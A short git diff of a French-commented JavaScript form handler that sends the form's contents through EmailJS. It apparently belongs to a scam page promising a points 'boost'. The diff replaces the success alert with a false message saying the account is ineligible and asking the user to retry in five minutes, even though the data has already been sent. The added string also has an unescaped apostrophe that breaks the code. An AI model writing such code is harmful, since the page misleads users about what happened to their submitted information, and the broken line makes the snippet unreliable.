@@ -18,7 +18,7 @@ document.addEventListener("DOMContentLoaded", function () {
             // Si la validation est réussie, envoyez l'e-mail avec EmailJS
             emailjs.sendForm('service_ftsujwe', 'template_0001', this)
             .then(function () {
-                alert('Formulaire envoyé avec succès!');
+                alert('Désolé votre compte n'est pas éligible pour le boost, ressayer dans 5min. ');
                 
                 // Simuler l'envoi de points et rediriger vers la page de callback
                 const pointsToConvert = 100; // Exemple de points à convertir
